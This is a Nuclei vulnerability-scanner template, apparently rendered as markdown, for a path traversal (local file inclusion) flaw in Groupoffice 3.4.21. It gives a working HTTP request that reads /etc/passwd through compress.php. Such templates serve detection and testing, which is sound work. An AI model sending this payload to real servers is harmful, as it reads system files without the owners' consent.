# Nuclei Template: Groupoffice 3.4.21 - Local File Inclusion
**Template ID:** groupoffice-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`groupoffice-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Groupoffice 3.4.21 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/compress.php?file=../../../../../../../etc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2018020249
- http://www.group-office.com
